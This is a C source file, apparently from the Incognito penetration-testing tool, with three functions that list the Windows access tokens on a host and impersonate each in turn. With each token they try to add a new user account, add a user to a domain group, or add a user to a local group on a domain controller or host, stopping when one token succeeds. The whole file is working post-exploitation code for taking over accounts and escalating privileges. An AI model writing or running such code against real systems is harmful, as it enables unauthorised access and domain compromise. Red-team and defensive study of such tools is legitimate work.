/*
Software License Agreement (BSD License)

Copyright (c) 2006, Luke Jennings (0xlukej@gmail.com)
All rights reserved.

Redistribution and use of this software in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

* Redistributions of source code must retain the above
  copyright notice, this list of conditions and the
  following disclaimer.

* Redistributions in binary form must reproduce the above
  copyright notice, this list of conditions and the
  following disclaimer in the documentation and/or other
  materials provided with the distribution.

* Neither the name of Luke Jennings nor the names of its
  contributors may be used to endorse or promote products
  derived from this software without specific prior
  written permission of Luke Jennings.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#define _CRT_SECURE_NO_DEPRECATE 1
#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <aclapi.h>
#include <accctrl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <lm.h>
#include <wchar.h>
#include "list_tokens.h"
#include "handle_arguments.h"
#include "token_info.h"

void add_user(char *dc_netbios_name, char *username, char *password)
{
	USER_INFO_1 ui;
   	DWORD dwLevel = 1, dwError = 0, num_tokens = 0, i;
   	NET_API_STATUS nStatus;
	SavedToken *token_list = NULL;
	wchar_t dc_netbios_name_u[BUF_SIZE], username_u[BUF_SIZE], password_u[BUF_SIZE];
	TOKEN_PRIVS token_privs;

	mbstowcs(dc_netbios_name_u, dc_netbios_name, strlen(dc_netbios_name)+1);
	mbstowcs(username_u, username, strlen(username)+1);
	mbstowcs(password_u, password, strlen(password)+1);

   	ui.usri1_name = username_u;
   	ui.usri1_password = password_u;
   	ui.usri1_priv = USER_PRIV_USER;
   	ui.usri1_home_dir = NULL;
   	ui.usri1_comment = NULL;
   	ui.usri1_flags = UF_SCRIPT;
   	ui.usri1_script_path = NULL;

	// Enumerate tokens
	output_status_string("[*] Enumerating tokens\n");

	token_list = get_token_list(&num_tokens, &token_privs);
	if (!token_list)
	{
		output_status_string("[-] Failed to enumerate tokens with error code: %d\n", GetLastError());
		return;
	}

	output_status_string("[*] Attempting to add user %s to host %s\n", username, dc_netbios_name);

	// Attempt to add user with every token
	for (i=0;i<num_tokens;i++)
	if (token_list[i].token)
	{
		// causes major problems (always error 127) once you have impersonated this token once. No idea why!!!
		if (!_stricmp("NT AUTHORITY\\ANONYMOUS LOGON", token_list[i].username))
			continue;

		ImpersonateLoggedOnUser(token_list[i].token);
		nStatus = NetUserAdd(dc_netbios_name_u, 1, (LPBYTE)&ui, &dwError);
		RevertToSelf();

   		switch (nStatus)
   		{
			case ERROR_ACCESS_DENIED:
			case ERROR_LOGON_FAILURE: // unknown username or bad password
			case ERROR_INVALID_PASSWORD:
				break;
			case NERR_Success:
				output_status_string("[+] Successfully added user\n");
				goto cleanup;
			case NERR_InvalidComputer:
				output_status_string("[-] Computer name invalid\n");
				goto cleanup;
			case NERR_NotPrimary:
				output_status_string("[-] Operation only allowed on primary domain controller\n");
				goto cleanup;
			case NERR_GroupExists:
				output_status_string("[-] Group already exists\n");
				goto cleanup;
			case NERR_UserExists:
				output_status_string("[-] User already exists\n");
				goto cleanup;
			case NERR_PasswordTooShort:
				output_status_string("[-] Password does not meet complexity requirements\n");
				goto cleanup;
			default:
				output_status_string("Unknown error: %d\n", nStatus);
				goto cleanup;
		}
	}

	output_status_string("[-] Access denied with all tokens\n");

cleanup:
	for (i=0;i<num_tokens;i++)
		CloseHandle(token_list[i].token);
	free(token_list);
}

void add_user_to_group(char *dc_netbios_name, char *groupname, char *username)
{
   	DWORD dwLevel = 1, dwError = 0, num_tokens = 0, i;
   	NET_API_STATUS nStatus;
	SavedToken *token_list = NULL;
	wchar_t dc_netbios_name_u[BUF_SIZE], username_u[BUF_SIZE], groupname_u[BUF_SIZE];
	TOKEN_PRIVS token_privs;

	mbstowcs(dc_netbios_name_u, dc_netbios_name, strlen(dc_netbios_name)+1);
	mbstowcs(username_u, username, strlen(username)+1);
	mbstowcs(groupname_u, groupname, strlen(groupname)+1);

	// Enumerate tokens
	output_status_string("[*] Enumerating tokens\n");

	token_list = get_token_list(&num_tokens, &token_privs);
	if (!token_list)
	{
		output_status_string("[-] Failed to enumerate tokens with error code: %d\n", GetLastError());
		return;
	}

	output_status_string("[*] Attempting to add user %s to group %s on domain controller %s\n", username, groupname, dc_netbios_name);

	// Attempt to add user with every token
	for (i=0;i<num_tokens;i++)
	if (token_list[i].token)
	{
		// causes major problems (always error 127) once you have impersonated this token once. No idea why!!!
		if (!_stricmp("NT AUTHORITY\\ANONYMOUS LOGON", token_list[i].username))
			continue;

		ImpersonateLoggedOnUser(token_list[i].token);
		nStatus = NetGroupAddUser(dc_netbios_name_u, groupname_u, username_u);
		RevertToSelf();

   		switch (nStatus)
   		{
			case ERROR_ACCESS_DENIED:
			case ERROR_LOGON_FAILURE: // unknown username or bad password
			case ERROR_INVALID_PASSWORD:
				break;
			case NERR_Success:
				output_status_string("[+] Successfully added user to group\n");
				goto cleanup;
			case NERR_InvalidComputer:
				output_status_string("[-] Computer name invalid\n");
				goto cleanup;
			case NERR_NotPrimary:
				output_status_string("[-] Operation only allowed on primary domain controller\n");
				goto cleanup;
			case NERR_SpeGroupOp:
				output_status_string("[-] Special group\n");
				goto cleanup;
			case NERR_UserNotFound:
				output_status_string("[-] User not found\n");
				goto cleanup;
			case NERR_GroupNotFound:
				output_status_string("[-] Group not found\n");
				goto cleanup;
			case 2236: // Can't find error code in documentation...found by testing
				output_status_string("[-] User already in group\n");
				goto cleanup;
			default:
				output_status_string("Unknown error: %d\n", nStatus);
				goto cleanup;
		}
	}

	output_status_string("[-] Access denied with all tokens\n");

cleanup:
	for (i=0;i<num_tokens;i++)
		CloseHandle(token_list[i].token);
	free(token_list);
}

void add_user_to_localgroup(char *dc_netbios_name, char *groupname, char *username)
{
   	DWORD dwLevel = 1, dwError = 0, num_tokens = 0, i;
   	NET_API_STATUS nStatus;
	LOCALGROUP_MEMBERS_INFO_3 localgroup_member;
	SavedToken *token_list = NULL;
	wchar_t dc_netbios_name_u[BUF_SIZE], username_u[BUF_SIZE], groupname_u[BUF_SIZE];
	TOKEN_PRIVS token_privs;

	mbstowcs(dc_netbios_name_u, dc_netbios_name, strlen(dc_netbios_name)+1);
	mbstowcs(username_u, username, strlen(username)+1);
	mbstowcs(groupname_u, groupname, strlen(groupname)+1);

	localgroup_member.lgrmi3_domainandname = username_u;

	// Enumerate tokens
	output_status_string("[*] Enumerating tokens\n");

	token_list = get_token_list(&num_tokens, &token_privs);
	if (!token_list)
	{
		output_status_string("[-] Failed to enumerate tokens with error code: %d\n", GetLastError());
		return;
	}

	output_status_string("[*] Attempting to add user %s to local group %s on host %s\n", username, groupname, dc_netbios_name);

	// Attempt to add user with every token
	for (i=0;i<num_tokens;i++)
	if (token_list[i].token)
	{
		// causes major problems (always error 127) once you have impersonated this token once. No idea why!!!
		if (!_stricmp("NT AUTHORITY\\ANONYMOUS LOGON", token_list[i].username))
			continue;

		ImpersonateLoggedOnUser(token_list[i].token);
		nStatus = NetLocalGroupAddMembers(dc_netbios_name_u, groupname_u, 3, (LPBYTE)&localgroup_member, 1);
		RevertToSelf();

   		switch (nStatus)
   		{
			case ERROR_ACCESS_DENIED:
			case ERROR_LOGON_FAILURE: // unknown username or bad password
			case ERROR_INVALID_PASSWORD:
				break;
			case NERR_Success:
				output_status_string("[+] Successfully added user to local group\n");
				goto cleanup;
			case NERR_InvalidComputer:
				output_status_string("[-] Computer name invalid\n");
				goto cleanup;
			case ERROR_NO_SUCH_MEMBER:
				output_status_string("[-] User not found\n");
				goto cleanup;
			case NERR_GroupNotFound:
			case 1376: // found by testing (also group not found)
				output_status_string("[-] Local group not found\n");
				goto cleanup;
			case ERROR_MEMBER_IN_ALIAS:
				output_status_string("[-] User already in group\n");
				goto cleanup;
			default:
				output_status_string("Unknown error: %d\n", nStatus);
				goto cleanup;
		}
	}

	output_status_string("[-] Access denied with all tokens\n");

cleanup:
	for (i=0;i<num_tokens;i++)
		CloseHandle(token_list[i].token);
	free(token_list);
}